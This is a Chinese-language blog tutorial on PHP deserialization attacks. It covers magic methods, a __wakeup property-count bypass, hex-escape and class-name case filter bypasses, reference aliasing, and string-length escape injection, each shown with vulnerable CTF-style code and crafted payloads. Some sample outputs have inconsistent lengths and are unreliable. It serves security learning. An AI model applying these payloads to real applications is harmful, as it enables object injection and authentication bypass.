-    <content><![CDATA[<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="前置代码条件："><a href="#前置代码条件：" class="headerlink" title="前置代码条件："></a>前置代码条件：</h2><h3 id="this"><a href="#this" class="headerlink" title="$this-&gt;"></a>$this-&gt;</h3><p><code>$this</code>在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，<code>$this</code>中并没有，哪个对象调用，<code>$this</code>就代表哪个对象， 也可以将<code>$this</code>理解为对象的引用，通过引用的方式访问一个对象的方法和属性。</p>
-<p><code>&lt;?php echo $this-&gt;tpl_id?&gt;</code>中(<code>$this-&gt;</code>表示实例化后调用具体对象)</p>
-<span id="more"></span>
-
-<p><strong>实列</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//创建一个类</span><br><span class="line">	Class Stu &#123;</span><br><span class="line">		public $name = &#x27; &#x27;;</span><br><span class="line">		public $age = 0;</span><br><span class="line">		//定义一个公共访问接口</span><br><span class="line">		public function say($name,$age)&#123;</span><br><span class="line">			$this-&gt;name = $name;</span><br><span class="line">			$this-&gt;age = $age;</span><br><span class="line">			return &#x27;我的名字是&#x27;.$this-&gt;name.</span><br><span class="line">						&#x27;今年我&#x27;.$this-&gt;age;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	//实例化两个对象</span><br><span class="line">	$jack = new Stu();</span><br><span class="line">	$smith = new Stu();</span><br><span class="line">	echo $jack-&gt;say(&#x27;jack&#x27;,30);</span><br><span class="line">	echo $smith-&gt;say(&#x27;smith&#x27;,20);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id=""><a href="#" class="headerlink" title="::"></a>::</h3><p><code>::</code>用来直接调用类中的属性或方法，没有实例化)</p>
-<p><strong>实例</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	Class b &#123;</span><br><span class="line">		var $name = &quot;test&quot;;</span><br><span class="line">		Function getName()&#123;</span><br><span class="line">			echo &#x27;test is good&#x27;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">//直接调用</span><br><span class="line">echo b::getName();//输出为test is good</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="什么是序列化，什么是反序列化？"><a href="#什么是序列化，什么是反序列化？" class="headerlink" title="什么是序列化，什么是反序列化？"></a>什么是序列化，什么是反序列化？</h2><h3 id="php序列化：serialize"><a href="#php序列化：serialize" class="headerlink" title="php序列化：serialize()"></a>php序列化：<code>serialize()</code></h3><p>序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
-<p>php序列化的字母标识：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a - <span class="keyword">array</span></span><br><span class="line">b - <span class="keyword">boolean</span></span><br><span class="line">d - <span class="keyword">double</span></span><br><span class="line">i - <span class="keyword">integer</span></span><br><span class="line">o - common <span class="keyword">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="keyword">string</span></span><br><span class="line">C - custom <span class="keyword">object</span></span><br><span class="line">O - <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">null</span></span></span><br><span class="line"><span class="class"><span class="title">R</span> - <span class="title">pointer</span> <span class="title">reference</span></span></span><br><span class="line"><span class="class"><span class="title">U</span> - <span class="title">unicode</span> <span class="title">string</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">NULL</span></span></span><br></pre></td></tr></table></figure>
-<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class TEST&#123;  </span><br><span class="line"> public $test1=&quot;11&quot;;  </span><br><span class="line"> private $test2=&quot;22&quot;;  </span><br><span class="line"> protected $test3=&quot;33&quot;;  </span><br><span class="line"> public function test4()  </span><br><span class="line"> &#123;  </span><br><span class="line"> echo $this-&gt;test1;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new TEST();  </span><br><span class="line">echo serialize($a); </span><br></pre></td></tr></table></figure>
-
-<p>输出为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o:4:&quot;TEST&quot;:3:&#123;s:5:&quot;test1&quot;;s:2:&quot;11&quot;;s:11:&quot; TEST test2&quot;;s:2:&quot;22&quot;;s:8:&quot; * test3&quot;;s:2:&quot;33&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>详解：</p>
-<ul>
-<li><code>o</code>代表类，<code>4</code>代表类名长度，<code>&quot;&quot;</code>中是类名</li>
-<li><code>3</code>表示类中的变量个数，<code>&#123;&#125;</code>中则是以<code>类型：长度：&quot;值&quot;</code>为格式依次展示类中变量</li>
-</ul>
-<p><strong>注意序列化后的内容只有成员变量，没有成员函数，比如下面的例子：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;xiaoshizi&quot;;</span><br><span class="line">        $this-&gt;b = &quot;laoshizi&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function happy()&#123;</span><br><span class="line">        return $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>输出为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意类中变量前的函数</strong></p>
-<ul>
-<li><p>如果是public，则直接输出</p>
-</li>
-<li><p>如果变量前是protected，则会在变量名前加上 <code>\x00*\x00</code></p>
-</li>
-<li><p>如果变量前是private，则会在变量名前加上 <code>\x00类名\x00属性名</code></p>
-</li>
-</ul>
-<p>如果直接输出，则会导致不可见字符 <code>\x00</code> 丢失变成空格 <code>  </code></p>
-<h3 id="php反序列化：unserialize"><a href="#php反序列化：unserialize" class="headerlink" title="php反序列化：unserialize()"></a>php反序列化：<code>unserialize()</code></h3><p>反序列化是将字符串转换成变量或对象的过程</p>
-<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。这样说可能还不是很具体，举个列子比如你网购买一个架子，发货为节省成本，是拆开给你发过去，到你手上，然后给你说明书让你组装，拆开给你这个过程可以说是序列化，你组装的过程就是反序列化.</p>
-<h4 id="实列及详解-1"><a href="#实列及详解-1" class="headerlink" title="实列及详解"></a>实列及详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class people</span><br><span class="line">&#123;</span><br><span class="line"> public $name = &quot;f1r3K0&quot;;</span><br><span class="line"> public $age = &#x27;18&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$class =  new people();</span><br><span class="line">$class_ser = serialize($class);</span><br><span class="line">print_r($class_ser);</span><br><span class="line">$class_unser = unserialize($class_ser);</span><br><span class="line">print_r($class_unser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>输出为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;people&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;f1r3K0&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">people Object</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; f1r3K0</span><br><span class="line">    [age] =&gt; 18</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意当使用 <code>unserialize()</code> 恢复对象时， 将调用 <code>__wakeup()</code> 成员函数</strong></p>
-<h4 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct //当一个对象创建时被调用，即在程序的开头被调用</span><br><span class="line">__destruct //当一个对象销毁时被调用，即在程序的结尾被调用</span><br><span class="line">__toString //当一个对象被当作一个字符串被调用</span><br><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //对不存在的方法或者不可访问的方法进行调用就自动调用</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
-
-<p>魔术方法指的是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
-<p>重点关注以下几个：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span><br><span class="line">__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。</span><br><span class="line">__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。</span><br><span class="line">__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。</span><br><span class="line">__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。</span><br></pre></td></tr></table></figure>
-
-<h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h5><p>简单描述就是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
-<p><strong>实列及详解</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;class.php&#x27;;  </span><br><span class="line">$select = $_GET[&#x27;select&#x27;];  </span><br><span class="line">$res=unserialize(@$select); //将@放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;  </span><br><span class="line"> private $username = &#x27;nonono&#x27;;  </span><br><span class="line"> private $password = &#x27;yesyes&#x27;;  </span><br><span class="line"></span><br><span class="line"> public function __construct($username,$password)&#123;  </span><br><span class="line"> $this-&gt;username = $username;  </span><br><span class="line"> $this-&gt;password = $password;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> function __wakeup()&#123;  </span><br><span class="line"> $this-&gt;username = &#x27;guest&#x27;;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> function __destruct()&#123;  </span><br><span class="line"> if ($this-&gt;password != 100) &#123;  </span><br><span class="line"> echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;  </span><br><span class="line"> echo &quot;You name is: &quot;;  </span><br><span class="line"> echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;  </span><br><span class="line"> echo &quot;You password is: &quot;;  </span><br><span class="line"> echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;  </span><br><span class="line"> die();  </span><br><span class="line"> &#125;  </span><br><span class="line"> if ($this-&gt;username === &#x27;admin&#x27;) &#123;  </span><br><span class="line"> global $flag;  </span><br><span class="line"> echo $flag;  </span><br><span class="line"> &#125;else&#123;  </span><br><span class="line"> echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;  </span><br><span class="line"> die();  </span><br><span class="line"></span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看源码我们需要<code>password=100，username=admin</code>。如果单纯输入<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;s:3:&quot;100&quot;;&#125;</code>反序列化过程中<code>__wakeup</code>方法里会把username赋值为guest。此时我们要修改类数使其大于2，就可以绕过<code>__wakeup</code>方法。注意是用<code>GET</code>方式，但是别忘了要Url编码。</p>
-<p>如何偷懒得到序列化格式？直接在源码后面编个脚本就行啦！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);  </span><br><span class="line">echo serialize($a);  </span><br><span class="line">echo urlencode(serialize($a));  </span><br></pre></td></tr></table></figure>
-<p>最终输出结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Url/?select = O%3A4%3A%22Name%22%3A4%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>
-
-<h5 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;S:4:&quot;%00*%00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="实例及详解"><a href="#实例及详解" class="headerlink" title="实例及详解"></a>实例及详解</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;admin&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function check($data)&#123;</span><br><span class="line">    if(stristr($data, &#x27;username&#x27;)!==False)&#123;</span><br><span class="line">        echo(&quot;你绕不过！！&quot;.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>由代码可知：username被ban了。</p>
-<p>原代码为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>转换后为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>75是u的16进制编码。</p>
-<h5 id="php类名大小写绕过"><a href="#php类名大小写绕过" class="headerlink" title="php类名大小写绕过"></a>php类名大小写绕过</h5><p>php类名对大小写不敏感，而且过滤并没有过滤大小写</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">global</span> <span class="variable">$flag</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;  </span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>很明显是触发析构函数就得到了flag，但是有过滤，如果匹配到了ctfshow就抛异常。所以可以构造CTFSHOW来绕过。</p>
-<h5 id="号绕过"><a href="#号绕过" class="headerlink" title="+号绕过"></a>+号绕过</h5><h5 id="利用-使两值恒等"><a href="#利用-使两值恒等" class="headerlink" title="利用&amp;使两值恒等"></a>利用&amp;使两值恒等</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);  </span><br><span class="line">include(&#x27;flag.php&#x27;);  </span><br><span class="line">highlight_file(__FILE__);  </span><br><span class="line">class ctfshowAdmin&#123;  </span><br><span class="line">public $token;  </span><br><span class="line">public $password;  </span><br><span class="line"></span><br><span class="line">public function __construct($t,$p)&#123;  </span><br><span class="line">$this-&gt;token=$t;  </span><br><span class="line">$this-&gt;password = $p;  </span><br><span class="line">&#125;  </span><br><span class="line">public function login()&#123;  </span><br><span class="line">return $this-&gt;token===$this-&gt;password;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);  </span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());  </span><br><span class="line"></span><br><span class="line">if($ctfshow-&gt;login())&#123;  </span><br><span class="line">echo $flag;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>$ctfshow-&gt;login()</code>这个成立才给<code>flag</code>，<code>$ctfshow-&gt;token=md5(mt_rand())</code>但是是随机的</p>
-<p>知识点：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;11&#x27;</span>;  </span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;  </span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//$b被赋值的是变量a的地址，php是按地址传参，a的值会随b值变化  </span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>
-
-<p>故可以用如下脚本达成目的：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;  </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$token</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"> <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();  </span><br><span class="line"><span class="keyword">echo</span> ( <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
-
-<h4 id="反序列化逃逸问题"><a href="#反序列化逃逸问题" class="headerlink" title="反序列化逃逸问题"></a>反序列化逃逸问题</h4><p>逃逸问题的本质是改变序列化字符串的长度，导致反序列化漏洞</p>
-<p>所以会有两种情况，一种是由长变短,一种是由短变长</p>
-<h5 id="由短变长"><a href="#由短变长" class="headerlink" title="由短变长"></a>由短变长</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;x&quot;,&quot;xx&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$age = &quot;I am 11&quot;;</span><br><span class="line">$arr = array($name,$age);</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=$new[1]&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>正常传入<code>name = mao</code>，输出为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(38) &quot;a:2:&#123;i:0;s:3:&quot;mao&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(3) &quot;mao&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;I am 11&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=I am 11</span><br></pre></td></tr></table></figure>
-
-<p>当传入<code>name = maox</code>时，就会出错：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(39) &quot;a:2:&#123;i:0;s:4:&quot;maox&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:bool(false)</span><br><span class="line">&lt;br/&gt;此时，age=</span><br></pre></td></tr></table></figure>
-
-<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>时，反而有输出：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(79) &quot;a:2:&#123;i:0;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(43) &quot;maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(6) &quot;woaini&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=woaini</span><br></pre></td></tr></table></figure>
-
-<p>这是为什么？</p>
-<p>在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾。</p>
-<p><code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>这一部分一共二十个字符，由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，从而造成<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>的溢出，而<code>&quot;</code>闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出<code>woaini</code>。最后的<code>;&#125;</code>闭合反序列化全过程导致原来的<code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>被舍弃，不影响反序列化过程。</p>
-<h5 id="由长变短"><a href="#由长变短" class="headerlink" title="由长变短"></a>由长变短</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;xx&quot;,&quot;x&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$arr[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">$arr[&#x27;age&#x27;] = $_GET[&#x27;age&#x27;];</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">var_dump($old);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=&quot;;</span><br><span class="line">echo $new[&#x27;age&#x27;];</span><br></pre></td></tr></table></figure>
-
-<p>正常情况传入<code>name=mao&amp;age=11</code>，输出为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;array(2) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(3) &quot;mao&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  string(2) &quot;11&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=11</span><br></pre></td></tr></table></figure>
-
-<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;</code>时，输出为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:string(94) &quot;a:2:&#123;s:4:&quot;name&quot;;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;array(2) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(43) &quot;maoxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  string(6) &quot;woaini&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=woaini</span><br></pre></td></tr></table></figure>
-
-<p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面由于有<code>&quot;</code>闭合了前面因此后面的参数就可以由我们自定义执行了。</p>
